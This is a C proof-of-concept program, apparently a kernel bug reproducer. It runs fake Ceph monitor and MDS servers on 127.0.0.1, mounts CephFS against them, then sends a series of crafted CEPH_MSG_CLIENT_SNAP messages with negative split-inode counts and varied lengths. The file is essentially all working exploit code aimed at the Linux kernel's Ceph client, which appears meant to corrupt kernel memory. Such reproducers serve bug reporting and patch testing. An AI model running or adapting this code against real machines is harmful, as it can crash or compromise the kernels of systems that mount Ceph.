// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <poll.h>

#define CEPH_BANNER            "ceph v027"
#define CEPH_BANNER_LEN        9
#define ENTITY_ADDR_WIRE_LEN   136

#define CEPH_MSGR_TAG_READY        1
#define CEPH_MSGR_TAG_CLOSE        6
#define CEPH_MSGR_TAG_MSG          7
#define CEPH_MSGR_TAG_ACK          8
#define CEPH_MSGR_TAG_KEEPALIVE    9
#define CEPH_MSGR_TAG_SEQ         13
#define CEPH_MSGR_TAG_KEEPALIVE2  14
#define CEPH_MSGR_TAG_KEEPALIVE2_ACK 15

#define CEPH_MSG_MON_MAP            4
#define CEPH_MSG_MON_SUBSCRIBE     15
#define CEPH_MSG_MON_SUBSCRIBE_ACK 16
#define CEPH_MSG_AUTH              17
#define CEPH_MSG_AUTH_REPLY        18
#define CEPH_MSG_MDS_MAP           21
#define CEPH_MSG_CLIENT_SESSION    22
#define CEPH_MSG_OSD_MAP           41
#define CEPH_MSG_CLIENT_SNAP    0x312

#define CEPH_ENTITY_TYPE_MON     0x01
#define CEPH_ENTITY_TYPE_MDS     0x02

#define CEPH_ENTITY_ADDR_TYPE_LEGACY 1

#define CEPH_AUTH_NONE           0x1
#define CRUSH_MAGIC              0x00010000u
#define CEPH_MDS_STATE_ACTIVE    13
#define CEPH_SNAP_OP_UPDATE      0

#define MON_PORT 6789
#define MDS_PORT 6800

static uint32_t crc_tab[256];
static void crc32c_init(void)
{
	for (uint32_t i = 0; i < 256; i++) {
		uint32_t c = i;
		for (int k = 0; k < 8; k++)
			c = (c & 1) ? (0x82F63B78u ^ (c >> 1)) : (c >> 1);
		crc_tab[i] = c;
	}
}
static uint32_t crc32c(uint32_t crc, const void *buf, size_t len)
{
	const uint8_t *p = buf;
	while (len--)
		crc = crc_tab[(crc ^ *p++) & 0xff] ^ (crc >> 8);
	return crc;
}

#define BMAX 8192
typedef struct { uint8_t d[BMAX]; size_t n; } buf;

static void b_reset(buf *b)                 { b->n = 0; }
static void b8(buf *b, uint8_t v)           { b->d[b->n++] = v; }
static void b16(buf *b, uint16_t v)         { b->d[b->n++] = v & 0xff; b->d[b->n++] = v >> 8; }
static void b32(buf *b, uint32_t v)         { for (int i = 0; i < 4; i++) b->d[b->n++] = (v >> (8 * i)) & 0xff; }
static void b64(buf *b, uint64_t v)         { for (int i = 0; i < 8; i++) b->d[b->n++] = (v >> (8 * i)) & 0xff; }
static void braw(buf *b, const void *s, size_t l) { memcpy(b->d + b->n, s, l); b->n += l; }
static void bpad(buf *b, size_t l)          { memset(b->d + b->n, 0, l); b->n += l; }
static void bstr(buf *b, const char *s)     { size_t l = strlen(s); b32(b, (uint32_t)l); braw(b, s, l); }
static void patch32(buf *b, size_t off, uint32_t v)
{
	for (int i = 0; i < 4; i++) b->d[off + i] = (v >> (8 * i)) & 0xff;
}

static void b_entity_addr(buf *b, uint32_t type, uint32_t nonce,
			  uint32_t ip_be, uint16_t port)
{
	b8(b, 1);
	b8(b, 1);
	b8(b, 1);
	b32(b, 12 + 16);
	b32(b, type);
	b32(b, nonce);
	b32(b, 16);
	b16(b, 2);
	b->d[b->n++] = port >> 8;
	b->d[b->n++] = port & 0xff;
	braw(b, &ip_be, 4);
	bpad(b, 8);
}

static const uint8_t FSID[16] = {
	0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
	0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x01
};

static int xwrite(int fd, const void *p, size_t n)
{
	const uint8_t *b = p;
	while (n) {
		ssize_t r = write(fd, b, n);
		if (r <= 0) return -1;
		b += r; n -= r;
	}
	return 0;
}
static int xread(int fd, void *p, size_t n)
{
	uint8_t *b = p;
	while (n) {
		ssize_t r = read(fd, b, n);
		if (r <= 0) return -1;
		b += r; n -= r;
	}
	return 0;
}

#define HDR_LEN    53

#define CEPH_FEATURE_MSG_AUTH 0x800000ULL
#define SERVER_FEATURES       CEPH_FEATURE_MSG_AUTH
#define FOOTER_LEN 21

static int send_msg(int fd, uint16_t type, uint8_t src_type,
		    const void *front, uint32_t front_len, uint64_t *seq)
{
	uint8_t hdr[HDR_LEN];
	uint8_t foot[FOOTER_LEN];
	uint8_t tag = CEPH_MSGR_TAG_MSG;
	buf h;

	b_reset(&h);
	b64(&h, ++(*seq));
	b64(&h, 0);
	b16(&h, type);
	b16(&h, 127);
	b16(&h, 1);
	b32(&h, front_len);
	b32(&h, 0);
	b32(&h, 0);
	b16(&h, 0);
	b8(&h, src_type);
	b64(&h, 0);
	b16(&h, 1);
	b16(&h, 0);

	b32(&h, crc32c(0, h.d, h.n));
	memcpy(hdr, h.d, HDR_LEN);

	b_reset(&h);
	b32(&h, crc32c(0, front, front_len));
	b32(&h, 0);
	b32(&h, 0);
	b64(&h, 0);
	b8(&h, 1);
	memcpy(foot, h.d, FOOTER_LEN);

	if (xwrite(fd, &tag, 1) < 0) return -1;
	if (xwrite(fd, hdr, HDR_LEN) < 0) return -1;
	if (front_len && xwrite(fd, front, front_len) < 0) return -1;
	if (xwrite(fd, foot, FOOTER_LEN) < 0) return -1;
	return 0;
}

static int recv_frame(int fd, uint8_t *front, uint32_t *front_len_out)
{
	uint8_t tag;
	uint8_t hdr[HDR_LEN];
	uint8_t scratch[64];
	uint32_t front_len, middle_len, data_len;
	uint16_t type;

	if (xread(fd, &tag, 1) < 0) return -1;

	switch (tag) {
	case CEPH_MSGR_TAG_MSG:
		break;
	case CEPH_MSGR_TAG_ACK:
		if (xread(fd, scratch, 8) < 0) return -1;
		return -2;
	case CEPH_MSGR_TAG_KEEPALIVE:
		return -2;
	case CEPH_MSGR_TAG_KEEPALIVE2:
		if (xread(fd, scratch, 8) < 0) return -1;
		scratch[8] = CEPH_MSGR_TAG_KEEPALIVE2_ACK;
		if (xwrite(fd, &scratch[8], 1) < 0) return -1;
		if (xwrite(fd, scratch, 8) < 0) return -1;
		return -2;
	case CEPH_MSGR_TAG_KEEPALIVE2_ACK:
		if (xread(fd, scratch, 8) < 0) return -1;
		return -2;
	case CEPH_MSGR_TAG_CLOSE:
		return -1;
	default:
		return -1;
	}

	if (xread(fd, hdr, HDR_LEN) < 0) return -1;
	type       = hdr[16] | (hdr[17] << 8);
	front_len  = hdr[22] | (hdr[23] << 8) | (hdr[24] << 16) | ((uint32_t)hdr[25] << 24);
	middle_len = hdr[26] | (hdr[27] << 8) | (hdr[28] << 16) | ((uint32_t)hdr[29] << 24);
	data_len   = hdr[30] | (hdr[31] << 8) | (hdr[32] << 16) | ((uint32_t)hdr[33] << 24);

	if (front_len > BMAX) return -1;
	if (front_len && xread(fd, front, front_len) < 0) return -1;
	while (middle_len) {
		size_t c = middle_len > sizeof(scratch) ? sizeof(scratch) : middle_len;
		if (xread(fd, scratch, c) < 0) return -1;
		middle_len -= c;
	}
	while (data_len) {
		size_t c = data_len > sizeof(scratch) ? sizeof(scratch) : data_len;
		if (xread(fd, scratch, c) < 0) return -1;
		data_len -= c;
	}
	if (xread(fd, scratch, FOOTER_LEN) < 0) return -1;

	if (front_len_out) *front_len_out = front_len;
	return (int)type;
}

static int do_handshake(int fd)
{
	uint8_t banner[CEPH_BANNER_LEN];
	uint8_t addr[ENTITY_ADDR_WIRE_LEN];
	uint8_t connect[33];
	uint8_t reply[26];
	uint32_t auth_len, connect_seq;
	buf b;

	b_reset(&b);
	braw(&b, CEPH_BANNER, CEPH_BANNER_LEN);

	bpad(&b, ENTITY_ADDR_WIRE_LEN);

	{
		size_t o = b.n;
		bpad(&b, ENTITY_ADDR_WIRE_LEN);
		b.d[o + 0] = 0; b.d[o + 1] = 0; b.d[o + 2] = 0; b.d[o + 3] = 0;
		b.d[o + 4] = 1;
		b.d[o + 8] = 0x00; b.d[o + 9] = 0x02;
		b.d[o + 10] = 0x30; b.d[o + 11] = 0x39;
		b.d[o + 12] = 127; b.d[o + 13] = 0; b.d[o + 14] = 0; b.d[o + 15] = 1;
	}
	if (xwrite(fd, b.d, b.n) < 0) return -1;

	if (xread(fd, banner, CEPH_BANNER_LEN) < 0) return -1;
	if (memcmp(banner, CEPH_BANNER, CEPH_BANNER_LEN)) return -1;
	if (xread(fd, addr, ENTITY_ADDR_WIRE_LEN) < 0) return -1;

	if (xread(fd, connect, sizeof(connect)) < 0) return -1;
	connect_seq = connect[16] | (connect[17] << 8) |
		      (connect[18] << 16) | ((uint32_t)connect[19] << 24);
	auth_len = connect[28] | (connect[29] << 8) |
		   (connect[30] << 16) | ((uint32_t)connect[31] << 24);
	while (auth_len) {
		uint8_t junk[64];
		size_t c = auth_len > sizeof(junk) ? sizeof(junk) : auth_len;
		if (xread(fd, junk, c) < 0) return -1;
		auth_len -= c;
	}

	b_reset(&b);
	b8(&b, CEPH_MSGR_TAG_READY);
	b64(&b, SERVER_FEATURES);
	b32(&b, 1);
	b32(&b, connect_seq + 1);
	b32(&b, 0);
	b32(&b, 0);
	b8(&b, 0);
	memcpy(reply, b.d, sizeof(reply));
	if (xwrite(fd, reply, sizeof(reply)) < 0) return -1;
	return 0;
}

static uint32_t LOOPBACK;

static void build_monmap(buf *front)
{
	buf blob;
	size_t lenoff, start;

	b_reset(&blob);
	b8(&blob, 3);
	b8(&blob, 3);
	lenoff = blob.n; b32(&blob, 0);
	start = blob.n;
	braw(&blob, FSID, 16);
	b32(&blob, 1);
	b32(&blob, 1);
	bstr(&blob, "a");
	b_entity_addr(&blob, CEPH_ENTITY_ADDR_TYPE_LEGACY, 0, LOOPBACK, MON_PORT);
	patch32(&blob, lenoff, (uint32_t)(blob.n - start));

	b_reset(front);
	b32(front, (uint32_t)blob.n);
	braw(front, blob.d, blob.n);
}

static void build_auth_reply(buf *front)
{
	b_reset(front);
	b32(front, CEPH_AUTH_NONE);
	b32(front, 0);
	b64(front, 1);
	b32(front, 0);
	b32(front, 0);
}

static void build_sub_ack(buf *front)
{
	b_reset(front);
	b32(front, 300);
	braw(front, FSID, 16);
}

static void build_osdmap(buf *front)
{
	buf blob;

	b_reset(&blob);
	b16(&blob, 6);
	braw(&blob, FSID, 16);
	b32(&blob, 1);
	b32(&blob, 0); b32(&blob, 0);
	b32(&blob, 0); b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 28);
	b32(&blob, CRUSH_MAGIC);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);

	b_reset(front);
	braw(front, FSID, 16);
	b32(front, 0);
	b32(front, 1);
	b32(front, 1);
	b32(front, (uint32_t)blob.n);
	braw(front, blob.d, blob.n);
}

static void build_mdsmap(buf *front)
{
	buf blob;

	b_reset(&blob);
	b8(&blob, 1);
	b8(&blob, 1);
	b32(&blob, 2);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 60);
	b32(&blob, 300);
	b64(&blob, 1ULL << 40);
	b32(&blob, 1);
	b32(&blob, 1);

	b64(&blob, 1);
	b8(&blob, 3);
	b64(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 1);
	b32(&blob, CEPH_MDS_STATE_ACTIVE);
	b64(&blob, 0);
	b_entity_addr(&blob, CEPH_ENTITY_ADDR_TYPE_LEGACY, 0, LOOPBACK, MDS_PORT);
	b32(&blob, 0); b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);
	b32(&blob, 0);

	b32(&blob, 0);
	b64(&blob, 0);

	b_reset(front);
	braw(front, FSID, 16);
	b32(front, 2);
	b32(front, (uint32_t)blob.n);
	braw(front, blob.d, blob.n);
}

static void build_client_snap(buf *front, uint32_t k, uint32_t front_len)
{
	b_reset(front);
	b32(front, CEPH_SNAP_OP_UPDATE);
	b64(front, 0);
	b32(front, (uint32_t)(-(int32_t)k));
	b32(front, 0);
	b32(front, 0);
	while (front->n < front_len)
		b8(front, 0);
}

static const struct { uint32_t k, front_len; } SHOTS[] = {
	{ 4,   64 }, { 5,   64 }, { 6,   64 },
	{ 4,   96 }, { 5,   96 }, { 6,   96 },
	{ 4,  128 }, { 5,  128 }, { 6,  128 },
	{ 4,  192 }, { 5,  256 }, { 6,  512 },
	{ 4, 1024 }, { 5, 2048 }, { 6,   72 },
	{ 4,   40 }, { 5,   32 }, { 6,   24 },
	{ 0x100,    64 },
	{ 0x100,  1024 },
	{ 0x1000,   64 },
	{ 0x100000, 64 },
};
#define NSHOTS (sizeof(SHOTS) / sizeof(SHOTS[0]))

static void handle_mon(int fd)
{
	uint64_t seq = 0;
	buf f;
	uint8_t inbuf[BMAX];

	if (do_handshake(fd) < 0) {
		dprintf(2, "[mon] handshake failed\n");
		return;
	}
	dprintf(2, "[mon] handshake done\n");

	for (;;) {
		int type = recv_frame(fd, inbuf, NULL);
		if (type == -1) return;
		if (type == -2) continue;

		switch (type) {
		case CEPH_MSG_AUTH:
			dprintf(2, "[mon] MAuth -> MAuthReply\n");
			build_auth_reply(&f);
			if (send_msg(fd, CEPH_MSG_AUTH_REPLY, CEPH_ENTITY_TYPE_MON,
				     f.d, f.n, &seq) < 0) return;
			break;
		case CEPH_MSG_MON_SUBSCRIBE:
			dprintf(2, "[mon] MMonSubscribe -> monmap/ack/osdmap/mdsmap\n");
			build_monmap(&f);
			if (send_msg(fd, CEPH_MSG_MON_MAP, CEPH_ENTITY_TYPE_MON,
				     f.d, f.n, &seq) < 0) return;
			build_sub_ack(&f);
			if (send_msg(fd, CEPH_MSG_MON_SUBSCRIBE_ACK, CEPH_ENTITY_TYPE_MON,
				     f.d, f.n, &seq) < 0) return;
			build_osdmap(&f);
			if (send_msg(fd, CEPH_MSG_OSD_MAP, CEPH_ENTITY_TYPE_MON,
				     f.d, f.n, &seq) < 0) return;
			build_mdsmap(&f);
			if (send_msg(fd, CEPH_MSG_MDS_MAP, CEPH_ENTITY_TYPE_MON,
				     f.d, f.n, &seq) < 0) return;
			break;
		default:
			dprintf(2, "[mon] ignoring msg type %d\n", type);
			break;
		}
	}
}

static void handle_mds(int fd)
{
	uint64_t seq = 0;
	buf f;
	uint8_t inbuf[BMAX];
	size_t i;

	if (do_handshake(fd) < 0) {
		dprintf(2, "[mds] handshake failed\n");
		return;
	}
	dprintf(2, "[mds] handshake done, firing CEPH_MSG_CLIENT_SNAP\n");

	for (i = 0; i < NSHOTS; i++) {
		struct pollfd pfd = { .fd = fd, .events = POLLIN };

		build_client_snap(&f, SHOTS[i].k, SHOTS[i].front_len);
		dprintf(2, "[mds] snap #%zu num_split_inos=-%u front_len=%u\n",
			i, SHOTS[i].k, SHOTS[i].front_len);
		if (send_msg(fd, CEPH_MSG_CLIENT_SNAP, CEPH_ENTITY_TYPE_MDS,
			     f.d, f.n, &seq) < 0)
			return;

		while (poll(&pfd, 1, 120) > 0 && (pfd.revents & POLLIN)) {
			int type = recv_frame(fd, inbuf, NULL);
			if (type == -1)
				return;
			if (type >= 0)
				dprintf(2, "[mds] got msg type %d\n", type);
			pfd.revents = 0;
		}
	}

	for (;;) {
		int type = recv_frame(fd, inbuf, NULL);
		if (type == -1) return;
	}
}

static int make_listener(uint16_t port)
{
	int fd, one = 1;
	struct sockaddr_in sa;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) { perror("socket"); exit(1); }
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = LOOPBACK;
	sa.sin_port = htons(port);
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { perror("bind"); exit(1); }
	if (listen(fd, 8) < 0) { perror("listen"); exit(1); }
	return fd;
}

static void serve(int lfd, void (*fn)(int))
{
	for (;;) {
		int cfd = accept(lfd, NULL, NULL);
		if (cfd < 0) {
			if (errno == EINTR) continue;
			return;
		}
		if (fork() == 0) {
			int one = 1;
			setsockopt(cfd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
			fn(cfd);
			_exit(0);
		}
		close(cfd);
	}
}

int main(void)
{
	int mon_fd, mds_fd;
	pid_t p1, p2;
	int ret;

	setvbuf(stdout, NULL, _IONBF, 0);
	signal(SIGCHLD, SIG_IGN);
	signal(SIGPIPE, SIG_IGN);

	crc32c_init();
	LOOPBACK = inet_addr("127.0.0.1");

	mon_fd = make_listener(MON_PORT);
	mds_fd = make_listener(MDS_PORT);

	p1 = fork();
	if (p1 == 0) { close(mds_fd); serve(mon_fd, handle_mon); _exit(0); }
	p2 = fork();
	if (p2 == 0) { close(mon_fd); serve(mds_fd, handle_mds); _exit(0); }
	close(mon_fd);
	close(mds_fd);

	mkdir("./cephmnt", 0755);
	sleep(1);

	printf("[*] mounting cephfs against the fake mon ...\n");
	ret = mount("127.0.0.1:6789:/", "./cephmnt", "ceph", 0,
		    "ms_mode=legacy,mount_timeout=20,noshare");
	printf("[*] mount() = %d (%s)\n", ret, ret ? strerror(errno) : "ok");

	sleep(5);
	kill(p1, SIGKILL);
	kill(p2, SIGKILL);
	printf("[*] done\n");
	return 0;
}
